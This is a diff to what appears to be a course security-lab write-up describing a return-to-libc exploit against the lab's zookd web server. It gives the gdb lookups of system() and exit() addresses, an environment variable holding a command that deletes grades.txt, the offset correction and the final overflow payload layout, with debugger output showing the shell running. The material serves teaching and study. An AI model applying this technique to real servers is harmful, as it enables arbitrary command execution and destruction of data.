@@ -169,9 +169,49 @@ The new shellcode can be created as follows:
 
 ## Ret-to-libc
 
-We can locate the unlink() system call address from gdb while we are attached to the zoobar process.
+In the return to libc exercise we used the following technique to achieve the goal to unlink the grades.txt file:
 
-    (gdb) p unlink
-    $1 = {<text variable, no debug info>} 0x40102450 <unlink>
+The idea was to use a system function call that we are using to execute our own, custom environment variable that will be used to unlink the grades.txt file.
+
+First, we locate the system function call address from gdb while we are attached to the zoobar process.
+
+    (gdb) p system
+    $1 = {<text variable, no debug info>} 0xb7e6b100 <__libc_system>
     
-The printed address is the one we will be using in our exploit to call the unlink sys call.
+The printed address is the one we will be using in our exploit in the RET call. After this, we will use the exit() function to terminate the program gracefully.
+
+    (gdb) p exit
+    $2 = {<text variable, no debug info>} 0xb7e5e150 <__GI_exit>
+
+Next, we create the environment variable that we will be using in our exploit.
+
+    export RM="unlink /home/httpd/grades.txt"
+    
+Now we need to locate the environment variable address in the memory. We used a script provided by here http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf.
+
+    httpd@vm-6858:~/lab$ ./getenv RM
+    RM is stored at address 0xbffff8ca
+    
+The memory address of the environment variable is not always the exact address and usually it is necessary to deduce the environment variable address:
+
+    zookd-nxstack: [2352] Request failed: Error forwarding request: /AAAAAA.....snip....AAAAAAAA
+    [New process 2361]
+    process 2361 is executing new program: /bin/dash
+    sh: 1: k: not found
+    zookfs-nxstack: recvfd: Success
+    [Inferior 2 (process 2361) exited with code 0177]
+
+By counting backwards 5 bytes, we get the correct address, which is 0xbffff8c5. After modifying our exploit with the correct address we successfully unlink the grades.txt file.
+
+    [New process 2374]
+    process 2374 is executing new program: /bin/dash
+    [New process 2375]
+    process 2375 is executing new program: /usr/bin/unlink
+    zookfs-nxstack: recvfd: Success
+    [Inferior 3 (process 2375) exited normally]
+    
+The final layout looks like this:
+
+     AAAAAAAAAAAAAA   0xb7e6b100     0xb7e5e150     0xbffff8c5
+    |--------------|--------------|--------------|--------------|
+         buffer         system()       exit()          env
